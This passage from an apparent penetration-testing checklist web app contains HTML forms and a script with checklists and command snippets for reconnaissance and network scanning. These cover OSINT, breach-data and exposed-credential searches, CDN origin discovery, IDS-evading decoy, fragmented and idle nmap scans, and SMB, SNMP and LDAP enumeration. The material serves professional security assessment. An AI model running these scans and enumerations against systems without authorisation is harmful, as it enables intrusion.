                    </thead>
                    <tbody id="findings-table-body"><tr>
                    <td>1. Reconnaissance &amp; Intelligence Gathering</td>
                    <td class="text-center count-high">1</td>
                    <td class="text-center ">0</td>
                    <td class="text-center ">0</td>
                    <td class="text-center">0</td>
                    <td class="text-center"><strong>1</strong></td>
                    <td>
                        <div class="findings-actions">
                            <button class="action-btn add-finding" data-category="reconnaissance">
                                <i class="fas fa-plus"></i> <span class="hidden sm:inline">Add</span>
                            </button>
                            
                            <button class="action-btn view-findings" data-category="reconnaissance">
                                <i class="fas fa-eye"></i> <span class="hidden sm:inline">View (1)</span>
                            </button>
                            
                        </div>
                    </td>
                </tr><tr>
                    <td>2. Network Scanning &amp; Enumeration</td>
                    <td class="text-center ">0</td>
                    <td class="text-center ">0</td>
                    <td class="text-center ">0</td>
                    <td class="text-center">0</td>
                    <td class="text-center"><strong>0</strong></td>
                    <td>
                        <div class="findings-actions">
                            <button class="action-btn add-finding" data-category="network-scanning">
                                <i class="fas fa-plus"></i> <span class="hidden sm:inline">Add</span>
                            </button>
                            
                        </div>
                    </td>
                </tr><tr>
                    <td>3. Vulnerability Assessment</td>
                    <td class="text-center ">0</td>
                    <td class="text-center ">0</td>
                    <td class="text-center ">0</td>
                    <td class="text-center">0</td>
                    <td class="text-center"><strong>0</strong></td>
                    <td>
                        <div class="findings-actions">
                            <button class="action-btn add-finding" data-category="vulnerability-assessment">
                                <i class="fas fa-plus"></i> <span class="hidden sm:inline">Add</span>
                            </button>
                            
                        </div>
                    </td>
                </tr><tr>
                    <td>4. Network Exploitation</td>
                    <td class="text-center ">0</td>
                    <td class="text-center ">0</td>
                    <td class="text-center ">0</td>
                    <td class="text-center">0</td>
                    <td class="text-center"><strong>0</strong></td>
                    <td>
                        <div class="findings-actions">
                            <button class="action-btn add-finding" data-category="exploitation">
                                <i class="fas fa-plus"></i> <span class="hidden sm:inline">Add</span>
                            </button>
                            
                        </div>
                    </td>
                </tr><tr>
                    <td>5. Post-Exploitation</td>
                    <td class="text-center ">0</td>
                    <td class="text-center ">0</td>
                    <td class="text-center ">0</td>
                    <td class="text-center">0</td>
                    <td class="text-center"><strong>0</strong></td>
                    <td>
                        <div class="findings-actions">
                            <button class="action-btn add-finding" data-category="post-exploitation">
                                <i class="fas fa-plus"></i> <span class="hidden sm:inline">Add</span>
                            </button>
                            
                        </div>
                    </td>
                </tr><tr>
                    <td>6. Wireless Network Testing</td>
                    <td class="text-center ">0</td>
                    <td class="text-center ">0</td>
                    <td class="text-center ">0</td>
                    <td class="text-center">0</td>
                    <td class="text-center"><strong>0</strong></td>
                    <td>
                        <div class="findings-actions">
                            <button class="action-btn add-finding" data-category="wireless">
                                <i class="fas fa-plus"></i> <span class="hidden sm:inline">Add</span>
                            </button>
                            
                        </div>
                    </td>
                </tr><tr>
                    <td>7. Infrastructure Security Assessment</td>
                    <td class="text-center ">0</td>
                    <td class="text-center ">0</td>
                    <td class="text-center ">0</td>
                    <td class="text-center">0</td>
                    <td class="text-center"><strong>0</strong></td>
                    <td>
                        <div class="findings-actions">
                            <button class="action-btn add-finding" data-category="infrastructure">
                                <i class="fas fa-plus"></i> <span class="hidden sm:inline">Add</span>
                            </button>
                            
                        </div>
                    </td>
                </tr><tr>
                    <td>8. Active Directory &amp; Identity Testing</td>
                    <td class="text-center ">0</td>
                    <td class="text-center ">0</td>
                    <td class="text-center ">0</td>
                    <td class="text-center">0</td>
                    <td class="text-center"><strong>0</strong></td>
                    <td>
                        <div class="findings-actions">
                            <button class="action-btn add-finding" data-category="active-directory">
                                <i class="fas fa-plus"></i> <span class="hidden sm:inline">Add</span>
                            </button>
                            
                        </div>
                    </td>
                </tr><tr>
                    <td>9. Industrial Control Systems Testing</td>
                    <td class="text-center ">0</td>
                    <td class="text-center ">0</td>
                    <td class="text-center ">0</td>
                    <td class="text-center">0</td>
                    <td class="text-center"><strong>0</strong></td>
                    <td>
                        <div class="findings-actions">
                            <button class="action-btn add-finding" data-category="industrial-control">
                                <i class="fas fa-plus"></i> <span class="hidden sm:inline">Add</span>
                            </button>
                            
                        </div>
                    </td>
                </tr><tr>
                    <td>10. Cloud Network Security</td>
                    <td class="text-center ">0</td>
                    <td class="text-center ">0</td>
                    <td class="text-center ">0</td>
                    <td class="text-center">0</td>
                    <td class="text-center"><strong>0</strong></td>
                    <td>
                        <div class="findings-actions">
                            <button class="action-btn add-finding" data-category="cloud-network">
                                <i class="fas fa-plus"></i> <span class="hidden sm:inline">Add</span>
                            </button>
                            
                        </div>
                    </td>
                </tr><tr>
                    <td>11. Container &amp; Virtualization Networks</td>
                    <td class="text-center ">0</td>
                    <td class="text-center ">0</td>
                    <td class="text-center ">0</td>
                    <td class="text-center">0</td>
                    <td class="text-center"><strong>0</strong></td>
                    <td>
                        <div class="findings-actions">
                            <button class="action-btn add-finding" data-category="container-networks">
                                <i class="fas fa-plus"></i> <span class="hidden sm:inline">Add</span>
                            </button>
                            
                        </div>
                    </td>
                </tr><tr>
                    <td>12. Network Protocol Analysis</td>
                    <td class="text-center ">0</td>
                    <td class="text-center ">0</td>
                    <td class="text-center ">0</td>
                    <td class="text-center">0</td>
                    <td class="text-center"><strong>0</strong></td>
                    <td>
                        <div class="findings-actions">
                            <button class="action-btn add-finding" data-category="protocol-analysis">
                                <i class="fas fa-plus"></i> <span class="hidden sm:inline">Add</span>
                            </button>
                            
                        </div>
                    </td>
                </tr></tbody>
                </table>
            </div>
        </section>
    </main>

    <!-- Modals -->
    <!-- Project Edit Modal -->
    <div id="project-modal" class="modal-overlay">
        <div class="modal">
            <div class="modal-header">
                <h3 class="modal-title">Edit Project Details</h3>
                <button class="modal-close" data-dismiss="modal">
                    <i class="fas fa-times"></i>
                </button>
            </div>
            <div class="modal-body">
                <div class="form-group">
                    <label for="edit-project-name" class="form-label">Project Name</label>
                    <input type="text" id="edit-project-name" class="form-control" required="">
                </div>
                <div class="form-group">
                    <label for="edit-project-target" class="form-label">Target</label>
                    <input type="text" id="edit-project-target" class="form-control">
                </div>
                <div class="form-group">
                    <label for="edit-project-date" class="form-label">Start Date</label>
                    <input type="date" id="edit-project-date" class="form-control">
                </div>
                <div class="form-group">
                    <label for="edit-project-tester" class="form-label">Lead Tester</label>
                    <input type="text" id="edit-project-tester" class="form-control">
                </div>
                <div class="form-group">
                    <label for="edit-project-scope" class="form-label">Scope</label>
                    <textarea id="edit-project-scope" class="form-control" rows="3"></textarea>
                </div>
            </div>
            <div class="modal-footer">
                <button class="btn btn-secondary" data-dismiss="modal">Cancel</button>
                <button id="btn-save-project" class="btn btn-primary">Save Changes</button>
            </div>
        </div>
    </div>

    <!-- Finding Modal -->
    <div id="finding-modal" class="modal-overlay">
        <div class="modal">
            <div class="modal-header">
                <h3 id="finding-modal-title" class="modal-title">Add Finding</h3>
                <button class="modal-close" data-dismiss="modal">
                    <i class="fas fa-times"></i>
                </button>
            </div>
            <div class="modal-body">
                <div class="form-group">
                    <label for="finding-category" class="form-label">Category</label>
                    <select id="finding-category" class="form-control">
                        <!-- Options will be populated by JavaScript -->
                    </select>
                </div>
                <div class="form-group">
                    <label for="finding-title" class="form-label">Title</label>
                    <input type="text" id="finding-title" class="form-control" required="">
                </div>
                <div class="form-group">
                    <label for="finding-severity" class="form-label">Severity</label>
                    <select id="finding-severity" class="form-control">
                        <option value="critical">Critical</option>
                        <option value="high">High</option>
                        <option value="medium">Medium</option>
                        <option value="low">Low</option>
                        <option value="info">Informational</option>
                    </select>
                </div>
                <div class="form-group">
                    <label for="finding-description" class="form-label">Description</label>
                    <textarea id="finding-description" class="form-control" rows="4" required=""></textarea>
                </div>
                <div class="form-group">
                    <label for="finding-steps" class="form-label">Steps to Reproduce</label>
                    <textarea id="finding-steps" class="form-control" rows="4"></textarea>
                </div>
                <div class="form-group">
                    <label for="finding-remediation" class="form-label">Remediation</label>
                    <textarea id="finding-remediation" class="form-control" rows="4"></textarea>
                </div>
            </div>
            <div class="modal-footer">
                <button class="btn btn-secondary" data-dismiss="modal">Cancel</button>
                <button id="btn-save-finding" class="btn btn-primary">Save Finding</button>
            </div>
        </div>
    </div>

    <!-- Projects Modal -->
    <div id="projects-modal" class="modal-overlay">
        <div class="modal">
            <div class="modal-header">
                <h3 class="modal-title">Manage Projects</h3>
                <button class="modal-close" data-dismiss="modal">
                    <i class="fas fa-times"></i>
                </button>
            </div>
            <div class="modal-body">
                <div style="display: flex; justify-content: space-between; margin-bottom: 1.5rem;">
                    <button id="btn-new-project" class="btn btn-primary">
                        <i class="fas fa-plus"></i>
                        <span>New Project</span>
                    </button>
                    <div style="position: relative; width: 60%;">
                        <input type="text" id="project-search" class="form-control" placeholder="Search projects...">
                        <i class="fas fa-search" style="position: absolute; right: 1rem; top: 0.75rem; color: var(--neutral-500);"></i>
                    </div>
                </div>
                <div id="projects-list" style="max-height: 450px; overflow-y: auto;">
                    <!-- Projects will be populated here by JavaScript -->
                </div>
            </div>
        </div>
    </div>

    <!-- New Project Modal -->
    <div id="new-project-modal" class="modal-overlay">
        <div class="modal">
            <div class="modal-header">
                <h3 class="modal-title">Create New Project</h3>
                <button class="modal-close" data-dismiss="modal">
                    <i class="fas fa-times"></i>
                </button>
            </div>
            <div class="modal-body">
                <div class="form-group">
                    <label for="new-project-name" class="form-label">Project Name</label>
                    <input type="text" id="new-project-name" class="form-control" required="">
                </div>
                <div class="form-group">
                    <label for="new-project-target" class="form-label">Target</label>
                    <input type="text" id="new-project-target" class="form-control" placeholder="e.g., example.com or 10.0.0.0/8">
                </div>
                <div class="form-group">
                    <label for="new-project-date" class="form-label">Start Date</label>
                    <input type="date" id="new-project-date" class="form-control">
                </div>
                <div class="form-group">
                    <label for="new-project-tester" class="form-label">Lead Tester</label>
                    <input type="text" id="new-project-tester" class="form-control">
                </div>
                <div class="form-group">
                    <label for="new-project-scope" class="form-label">Scope</label>
                    <textarea id="new-project-scope" class="form-control" rows="3" placeholder="Define the testing scope..."></textarea>
                </div>
            </div>
            <div class="modal-footer">
                <button class="btn btn-secondary" data-dismiss="modal">Cancel</button>
                <button id="btn-create-project" class="btn btn-primary">Create Project</button>
            </div>
        </div>
    </div>

    <!-- View Finding Modal -->
    <div id="view-finding-modal" class="modal-overlay">
        <div class="modal">
            <div class="modal-header">
                <h3 id="view-finding-title" class="modal-title">Finding Details</h3>
                <button class="modal-close" data-dismiss="modal">
                    <i class="fas fa-times"></i>
                </button>
            </div>
            <div class="modal-body">
                <div id="view-finding-content">
                    <!-- Finding content will be populated here by JavaScript -->
                </div>
            </div>
            <div class="modal-footer">
                <div id="view-finding-actions">
                    <!-- Action buttons will be populated here by JavaScript -->
                </div>
                <button class="btn btn-secondary" data-dismiss="modal">Close</button>
            </div>
        </div>
    </div>

    <!-- Confirm Modal -->
    <div id="confirm-modal" class="modal-overlay">
        <div class="modal" style="max-width: 450px;">
            <div class="modal-header">
                <h3 id="confirm-title" class="modal-title">Confirmation</h3>
                <button class="modal-close" data-dismiss="modal">
                    <i class="fas fa-times"></i>
                </button>
            </div>
            <div class="modal-body">
                <p id="confirm-message">Are you sure you want to proceed?</p>
            </div>
            <div class="modal-footer">
                <button class="btn btn-secondary" data-dismiss="modal">Cancel</button>
                <button id="confirm-yes" class="btn btn-danger">Yes, Proceed</button>
            </div>
        </div>
    </div>

    <!-- Toast Notifications -->
    <div class="toast-container">
        <!-- Toasts will be created dynamically -->
    </div>

    <!-- Footer -->
    <footer class="app-footer no-print">
        <div class="container">
            <div class="footer-content">
                <div class="footer-brand">
                    <h3>Network Penetration Testing Checklist</h3>
                    <p>A comprehensive framework for conducting methodical network penetration tests based on industry standards and best practices. Built for security professionals to ensure thorough and consistent testing across engagements.</p>
                </div>
                <div class="footer-links">
                    <h4>Resources</h4>
                    <ul>
                        <li><a href="https://www.sans.org/blog/pen-test-poster-white-board/" target="_blank"><i class="fas fa-external-link-alt"></i> SANS Penetration Testing</a></li>
                        <li><a href="https://github.com/swisskyrepo/PayloadsAllTheThings" target="_blank"><i class="fas fa-external-link-alt"></i> PayloadsAllTheThings</a></li>
                        <li><a href="https://book.hacktricks.xyz/" target="_blank"><i class="fas fa-external-link-alt"></i> HackTricks</a></li>
                        <li><a href="https://github.com/enaqx/awesome-pentest" target="_blank"><i class="fas fa-external-link-alt"></i> Awesome Pentest</a></li>
                    </ul>
                </div>
                <div class="footer-links">
                    <h4>About This Tool</h4>
                    <p>Data is saved locally in your browser via LocalStorage. No data is sent externally. Use Export/Import for backup or transfer between devices.</p>
                    <p style="margin-top: 0.75rem">This tool is developed for professional network security assessments and should be used only on systems you have proper authorization to test.</p>
                </div>
            </div>
            <div class="footer-bottom">
                <p> 2025 Network Penetration Testing Checklist | Created for professional network security assessments</p>
            </div>
        </div>
    </footer>



  <script>
        // --- Constants ---
        const STORAGE_KEY = 'netpentest-projects-v1';
        const TASK_STATUS = {
            NOT_TESTED: 'not-tested',
            PASSED: 'passed',
            NA: 'na'
        };

     // --- Category Data ---
// Structure: { categoryId: { title, subtitle, priority, icon, checklistItems: [{id, text, groupTitle?}, ...], techniquesHTML, toolsHTML } }
const categories = {
    'reconnaissance': {
        title: '1. Reconnaissance & Intelligence Gathering',
        subtitle: 'Collecting information about the target network without active scanning',
        priority: 'medium',
        icon: '<i class="fas fa-search" style="color: var(--info);"></i>',
        checklistItems: [
            { groupTitle: '1.1 Passive Information Gathering' },
            { id: '1.1.1', text: 'Gather information from public sources (OSINT)' },
            { id: '1.1.2', text: 'Identify IP address ranges and ASN information' },
            { id: '1.1.3', text: 'Collect domain and subdomain information' },
            { id: '1.1.4', text: 'Research SSL/TLS certificates for additional subdomains' },
            { id: '1.1.5', text: 'Identify email addresses and naming conventions' },
            { id: '1.1.6', text: 'Discover social media profiles and employee information' },
            
            { groupTitle: '1.2 Infrastructure Analysis' },
            { id: '1.2.1', text: 'Analyze BGP routing information' },
            { id: '1.2.2', text: 'Map relationships between IP blocks, domains, and organizations' },
            { id: '1.2.3', text: 'Identify cloud service usage (AWS, Azure, GCP)' },
            { id: '1.2.4', text: 'Examine historical DNS records' },
            { id: '1.2.5', text: 'Map network topology from public sources' },
            { id: '1.2.6', text: 'Identify CDN usage and origin servers' },
            
            { groupTitle: '1.3 Advanced Intelligence Gathering' },
            { id: '1.3.1', text: 'Search for exposed credentials in public repositories' },
            { id: '1.3.2', text: 'Identify technologies from job listings and employee profiles' },
            { id: '1.3.3', text: 'Discover connected networks through business relationships' },
            { id: '1.3.4', text: 'Gather information from previous security incidents' },
            { id: '1.3.5', text: 'Research vendor relationships and supply chain' },
            { id: '1.3.6', text: 'Analyze public code repositories for sensitive information' }
        ],
        techniquesHTML: `
        <div class="techniques-list">
            <div class="technique-item">
                <h4 class="technique-title">Autonomous System Number (ASN) Mapping</h4>
                <p class="technique-description">ASNs can reveal the entire network infrastructure of an organization, including all IP ranges they own.</p>
                <pre class="code-block">
# Using whois to find ASN
whois -h whois.radb.net -- '-i origin AS15169'

# Using amass for ASN enumeration
amass intel -asn 15169

# Using BGPView API
curl -s https://api.bgpview.io/asn/15169/prefixes | jq '.data.ipv4_prefixes[].prefix'

# Using ASNmap for comprehensive discovery
asnmap -a "Example Corp" -o asn_results.txt

# Finding related ASNs by organization
amass intel -org "Example Corporation"

# Mapping IP ranges to physical locations
asnmap -a 15169 -g</pre>
            </div>
            
            <div class="technique-item">
                <h4 class="technique-title">Certificate Transparency Logs</h4>
                <p class="technique-description">SSL/TLS certificates logged in Certificate Transparency logs can reveal subdomains not discoverable through other means.</p>
                <pre class="code-block">
# Using crt.sh for subdomain discovery
curl -s "https://crt.sh/?q=%25.example.com&output=json" | jq '.[].name_value' | sort -u

# Using certstream to monitor certificates in real-time
certstream-client | grep "example.com"

# With the ct-exposer tool
python3 ct-exposer.py -d example.com

# Using OpenSSL to examine certificates
openssl s_client -showcerts -connect example.com:443

# Finding historical certificates
curl -s "https://crt.sh/?q=%25.example.com&output=json" | jq '.[].not_before, .[].name_value' | sort

# Extracting certificate information from multiple sources
python3 ctfr.py -d example.com -o example_subdomains.txt</pre>
            </div>
            
            <div class="technique-item">
                <h4 class="technique-title">OSINT Framework for Network Discovery</h4>
                <p class="technique-description">Comprehensive approach to gathering network information without direct interaction.</p>
                <ul>
                    <li>DNS Records: A, AAAA, MX, TXT, NS, SOA, CNAME</li>
                    <li>Shodan/Censys searches for exposed services</li>
                    <li>GitHub/GitLab repositories for network configurations, IPs</li>
                    <li>Social media posts from IT staff about infrastructure</li>
                    <li>Archive.org for historical network information</li>
                    <li>Domain WHOIS history for administrative changes</li>
                    <li>Reverse IP lookup to find co-hosted domains</li>
                    <li>Security researcher databases and breach repositories</li>
                    <li>Public sandboxes and virus scanning services for leaked information</li>
                    <li>Job postings revealing technology stacks and infrastructure</li>
                    <li>Public cloud storage buckets associated with domain names</li>
                    <li>Conference presentations and technical papers by employees</li>
                </ul>
                <pre class="code-block">
# Comprehensive DNS enumeration
for type in A AAAA MX TXT NS SOA CNAME; do
    dig +nocmd example.com $type +noall +answer
done

# Searching GitHub for exposed credentials and config files
gh-dork -q "filename:.env domain:example.com" -o github_results.txt

# Using Shodan for exposed services
shodan search org:"Example Corp" --fields ip_str,port,hostnames

# Finding leaked info in public breach datasets
grep -i "@example.com" breached_data.txt</pre>
            </div>
            
            <div class="technique-item">
                <h4 class="technique-title">CDN Bypass Techniques</h4>
                <p class="technique-description">Methods to identify original server IPs behind CDN protection.</p>
                <pre class="code-block">
# Find historical DNS records before CDN implementation
dig @1.1.1.1 example.com A
curl -s "https://securitytrails.com/domain/example.com/history/a"

# Check for DNS TXT records that might reveal origin
dig @8.8.8.8 example.com TXT

# Try subdomain enumeration to find non-CDN protected assets
subfinder -d example.com | httpx -follow-redirects -status-code

# Email server MX records often point to actual infrastructure
dig @8.8.8.8 example.com MX

# Testing for origin IP through Web Cache
curl -s -H "Pragma: no-cache" -H "Cache-Control: no-cache" https://example.com/

# Using CloudFlair to attempt to find origin IP
python3 cloudflair.py -d example.com</pre>
            </div>
            
            <div class="technique-item">
                <h4 class="technique-title">Social Media OSINT</h4>
                <p class="technique-description">Using social media to map network infrastructure and employee information.</p>
                <pre class="code-block">
# LinkedIn reconnaissance for infrastructure insights
python3 linkedin2username.py -c "Example Corp" -u researcher@email.com -p password

# Searching Twitter for network information
twint -s "example.com network" -u "Example Corp IT" --since "2023-01-01"

# Identifying employee email patterns from social profiles
python3 h8mail -t "@example.com" -c h8mail_config.ini

# Finding public S3 buckets via social media links
python3 s3finder.py -k "example.com" -s -g</pre>
                <p>Key social media sources to examine:</p>
                <ul>
                    <li>LinkedIn for employee information and technology stack insights</li>
                    <li>Twitter for service announcements and outage reports</li>
                    <li>Reddit for technical discussions about infrastructure issues</li>
                    <li>GitHub/GitLab profiles of employees for code commits with network details</li>
                    <li>Stack Overflow questions related to specific infrastructure</li>
                    <li>Technology-specific forums where employees may discuss configurations</li>
                </ul>
            </div>
            
            <div class="technique-item">
                <h4 class="technique-title">Cloud Infrastructure Discovery</h4>
                <p class="technique-description">Identifying cloud resources and configurations associated with a target.</p>
                <pre class="code-block">
# S3 bucket enumeration
python3 s3scanner.py -t example.com -o discovered_buckets.txt

# Azure resource discovery
python3 azurehound.py -o azure_resources.json

# Search for cloud IP ranges
whois -h whois.radb.net -- '-i origin AS16509' # AWS IPs
whois -h whois.radb.net -- '-i origin AS8075' # Microsoft Azure IPs
whois -h whois.radb.net -- '-i origin AS15169' # Google Cloud IPs

# Finding cloud instances related to target
cloudenum -k example -m aws -o discovered_assets.txt

# Public bucket scanning
aws s3 ls s3://example-com-bucket --no-sign-request
gsutil ls gs://example-com-bucket</pre>
                <p>Cloud infrastructure indicators to identify:</p>
                <ul>
                    <li>Custom subdomains pointing to cloud services (e.g., aws.example.com)</li>
                    <li>CNAME records resolving to cloud provider domains</li>
                    <li>IP addresses within cloud provider ranges</li>
                    <li>SSL certificates issued to cloud instances</li>
                    <li>API endpoints following cloud naming conventions</li>
                </ul>
            </div>
        </div>
        `,
        toolsHTML: `
        <div class="tools-grid">
            <div class="tool-card">
                <div class="tool-header">
                    <i class="fas fa-globe tool-icon"></i>
                    <h4 class="tool-title">Amass</h4>
                </div>
                <p class="tool-description">In-depth Attack Surface Mapping and Asset Discovery tool that performs network mapping of attack surfaces and external asset discovery.</p>
                <a href="https://github.com/OWASP/Amass" target="_blank" class="tool-link">
                    <span>GitHub</span>
                    <i class="fas fa-external-link-alt"></i>
                </a>
            </div>
            
            <div class="tool-card">
                <div class="tool-header">
                    <i class="fas fa-search tool-icon"></i>
                    <h4 class="tool-title">Shodan</h4>
                </div>
                <p class="tool-description">Search engine for Internet-connected devices. Excellent for discovering exposed services and systems.</p>
                <a href="https://www.shodan.io/" target="_blank" class="tool-link">
                    <span>Website</span>
                    <i class="fas fa-external-link-alt"></i>
                </a>
            </div>
            
            <div class="tool-card">
                <div class="tool-header">
                    <i class="fas fa-sitemap tool-icon"></i>
                    <h4 class="tool-title">SpiderFoot</h4>
                </div>
                <p class="tool-description">Automates OSINT collection for discovering data about a target network footprint from public sources.</p>
                <a href="https://www.spiderfoot.net/" target="_blank" class="tool-link">
                    <span>Website</span>
                    <i class="fas fa-external-link-alt"></i>
                </a>
            </div>
            
            <div class="tool-card">
                <div class="tool-header">
                    <i class="fas fa-key tool-icon"></i>
                    <h4 class="tool-title">theHarvester</h4>
                </div>
                <p class="tool-description">Gathers emails, subdomains, hosts, employee names, open ports and banners from different public sources.</p>
                <a href="https://github.com/laramies/theHarvester" target="_blank" class="tool-link">
                    <span>GitHub</span>
                    <i class="fas fa-external-link-alt"></i>
                </a>
            </div>
            
            <div class="tool-card">
                <div class="tool-header">
                    <i class="fas fa-certificate tool-icon"></i>
                    <h4 class="tool-title">Subfinder</h4>
                </div>
                <p class="tool-description">Fast passive subdomain enumeration tool that uses various sources for discovery.</p>
                <a href="https://github.com/projectdiscovery/subfinder" target="_blank" class="tool-link">
                    <span>GitHub</span>
                    <i class="fas fa-external-link-alt"></i>
                </a>
            </div>
            
            <div class="tool-card">
                <div class="tool-header">
                    <i class="fas fa-history tool-icon"></i>
                    <h4 class="tool-title">SecurityTrails</h4>
                </div>
                <p class="tool-description">Provides historical DNS data and other intelligence on domains and IP addresses.</p>
                <a href="https://securitytrails.com/" target="_blank" class="tool-link">
                    <span>Website</span>
                    <i class="fas fa-external-link-alt"></i>
                </a>
            </div>
        </div>
        `
    },
    'network-scanning': {
        title: '2. Network Scanning & Enumeration',
        subtitle: 'Mapping the network, discovering hosts, and identifying services',
        priority: 'critical',
        icon: '<i class="fas fa-network-wired" style="color: var(--danger);"></i>',
        checklistItems: [
            { groupTitle: '2.1 Host Discovery' },
            { id: '2.1.1', text: 'Perform ARP scanning on local networks' },
            { id: '2.1.2', text: 'Conduct ICMP echo scanning (ping sweep)' },
            { id: '2.1.3', text: 'Use TCP/UDP discovery techniques for filtered environments' },
            { id: '2.1.4', text: 'Implement advanced host discovery techniques to bypass restrictions' },
            { id: '2.1.5', text: 'Map network topology including routers and switches' },
            { id: '2.1.6', text: 'Use IPv6 discovery techniques for dual-stack environments' },
            
            { groupTitle: '2.2 Port Scanning & Service Detection' },
            { id: '2.2.1', text: 'Perform comprehensive TCP port scanning' },
            { id: '2.2.2', text: 'Conduct UDP port scanning for critical services' },
            { id: '2.2.3', text: 'Identify services and versions (banner grabbing)' },
            { id: '2.2.4', text: 'Use specialized scanning techniques for stealth (SYN, FIN, NULL)' },
            { id: '2.2.5', text: 'Perform service analysis on non-standard ports' },
            { id: '2.2.6', text: 'Utilize timing techniques to avoid detection' },
            
            { groupTitle: '2.3 Network Enumeration' },
            { id: '2.3.1', text: 'Enumerate DNS services and zone transfer attempts' },
            { id: '2.3.2', text: 'Map internal domain structure' },
            { id: '2.3.3', text: 'Discover NetBIOS and LLMNR information' },
            { id: '2.3.4', text: 'Enumerate SNMP services with community string testing' },
            { id: '2.3.5', text: 'Discover and enumerate network shares (SMB/NFS)' },
            { id: '2.3.6', text: 'Enumerate LDAP services and directory information' },
            
            { groupTitle: '2.4 Advanced Network Analysis' },
            { id: '2.4.1', text: 'Perform OS fingerprinting' },
            { id: '2.4.2', text: 'Analyze network traffic patterns' },
            { id: '2.4.3', text: 'Map routing information and traceroute analysis' },
            { id: '2.4.4', text: 'Identify segmentation and filter rules' },
            { id: '2.4.5', text: 'Document results comprehensively with network diagrams' },
            { id: '2.4.6', text: 'Discover and analyze multicast service announcements' }
        ],
      techniquesHTML: `
        <div class="techniques-list">
            <div class="technique-item">
                <h4 class="technique-title">Comprehensive Port Scanning Methodology</h4>
                <p class="technique-description">A multi-phase approach to thoroughly scan networks while minimizing detection.</p>
                <pre class="code-block">
# Phase 1: Quick host discovery
sudo nmap -sn -T4 10.0.0.0/24 --disable-arp-ping
sudo netdiscover -r 10.0.0.0/24 -P

# Phase 2: Initial top ports scan on discovered hosts
sudo nmap -sS -Pn -T3 --top-ports 100 --max-retries 1 10.0.0.1,10.0.0.5,10.0.0.10

# Phase 3: Comprehensive scan on interesting hosts
sudo nmap -sS -sV -O -p- --script default,safe 10.0.0.5

# Phase 4: UDP scan on critical services
sudo nmap -sU -sV --version-intensity 1 -p 53,67,68,69,123,161,500 10.0.0.5

# Phase 5: Specialized scans for evasion (if needed)
sudo nmap -sS -Pn -f -T2 --data-length 24 --script vuln 10.0.0.5

# Phase 6: Service version detection with aggressive options
sudo nmap -sV --version-all -p 80,443,8080,8443 10.0.0.5

# Phase 7: IPv6 scanning for dual-stack hosts
sudo nmap -6 -sS -p 80,443,8080,8443 fe80::1

# Phase 8: Adaptive scanning based on discovered services
sudo nmap -p 80,443,8080 --script http-enum,http-headers,http-methods 10.0.0.5</pre>
                <p class="technique-note">Effective port scanning strategies should balance thoroughness with stealth. Consider network conditions and gradually increase scan intensity.</p>
            </div>
            
            <div class="technique-item">
                <h4 class="technique-title">Advanced Host Discovery Techniques</h4>
                <p class="technique-description">Methods to discover hosts in environments with strict filtering or IDS/IPS systems.</p>
                <ul>
                    <li><strong>Low and Slow Scanning:</strong> Using timing options (-T0 or -T1) and randomizing target selection</li>
                    <li><strong>Fragmentation:</strong> Breaking packets into smaller fragments to bypass packet filters</li>
                    <li><strong>Decoy Scanning:</strong> Using multiple spoofed source addresses to obscure the true source</li>
                    <li><strong>Custom Packets:</strong> Crafting specific packets using tools like hping3 or scapy</li>
                    <li><strong>Passive Techniques:</strong> Using tools like p0f for OS fingerprinting without active scanning</li>
                    <li><strong>Idle Scanning:</strong> Utilizing a zombie host to scan targets indirectly</li>
                    <li><strong>Non-standard Protocols:</strong> Testing for responses to uncommon protocol packets</li>
                    <li><strong>Source Port Manipulation:</strong> Using commonly allowed source ports to bypass filtering</li>
                </ul>
                <pre class="code-block">
# Decoy scan with multiple fake sources
sudo nmap -sS -D 10.1.1.1,10.2.2.2,ME,10.3.3.3 10.0.0.5

# Fragment packets to evade basic firewalls
sudo nmap -f -sS 10.0.0.5

# Custom TCP ACK scan with hping3
sudo hping3 --scan 1-1000 -A 10.0.0.5

# Idle/Zombie scan using a known idle host
sudo nmap -sI idle-host.example.com:80 10.0.0.5

# IPv6 link-local discovery
sudo nmap -6 --script targets-ipv6-multicast-echo --script-args 'newtargets,interface=eth0'

# Source port manipulation (common allowed ports)
sudo nmap -sS --source-port 53 10.0.0.5  # DNS source port
sudo nmap -sS --source-port 88 10.0.0.5  # Kerberos source port

# Passive OS fingerprinting
sudo p0f -i eth0 'host 10.0.0.5'</pre>
            </div>
            
            <div class="technique-item">
                <h4 class="technique-title">Service Enumeration Methodology</h4>
                <p class="technique-description">Systematically enumerating services to identify vulnerabilities.</p>
                <pre class="code-block">
# SNMP enumeration with common community strings
onesixtyone -c community.txt 10.0.0.5
snmpwalk -v 2c -c public 10.0.0.5 . | grep "System Description"
# Network information extraction
snmpwalk -v 2c -c public 10.0.0.5 .1.3.6.1.2.1.4.20 # IP addresses

# SMB enumeration
enum4linux -a 10.0.0.5
smbmap -H 10.0.0.5 -u anonymous -p '' -P 445
crackmapexec smb 10.0.0.5 --shares

# DNS enumeration
host -l domain.local 10.0.0.5
dig axfr @10.0.0.5 domain.local
dnsenum --dnsserver 10.0.0.5 --enum -p 10 -s 10 domain.local

# SMTP enumeration
smtp-user-enum -M VRFY -U users.txt -t 10.0.0.5

# LDAP enumeration
ldapsearch -h 10.0.0.5 -x -s base namingcontexts
ldapsearch -h 10.0.0.5 -x -b "DC=domain,DC=local" "(objectClass=*)"

# Web service enumeration
nikto -h http://10.0.0.5
gobuster dir -u http://10.0.0.5 -w /usr/share/wordlists/dirb/common.txt</pre>
            </div>
            
            <div class="technique-item">
                <h4 class="technique-title">IPv6 Network Reconnaissance</h4>
                <p class="technique-description">Techniques for discovering and enumerating IPv6 networks.</p>
                <pre class="code-block">
# IPv6 neighbor discovery scanning
alive6 eth0

# Address enumeration with passive monitoring
ndpmon -i eth0

# Multicast listener discovery
mld6_listener eth0

# Link-local address scanning
ping6 -I eth0 ff02::1

# DHCPv6 information discovery
dhcp6c -T -D eth0

# IPv6 DNS enumeration
dnsdict6 domain.local

# Comprehensive IPv6 scanning with specific address patterns
for i in {1..255}; do ping6 -c 1 -i 0.2 2001:db8::$i; done</pre>
            </div>
            
            <div class="technique-item">
                <h4 class="technique-title">Advanced Service Fingerprinting</h4>
                <p class="technique-description">Techniques that go beyond basic version detection to accurately identify services and potential vulnerabilities.</p>
                <pre class="code-block">
# Detailed Nmap service scanning
sudo nmap -sV --version-all --version-trace -p 1-65535 10.0.0.5

# Banner grabbing with netcat
nc -nv 10.0.0.5 22
nc -nv 10.0.0.5 80

# HTTP fingerprinting
whatweb -a 3 http://10.0.0.5

# SSL/TLS handshake analysis
sslscan --no-failed 10.0.0.5:443
testssl.sh -U --quiet 10.0.0.5:443

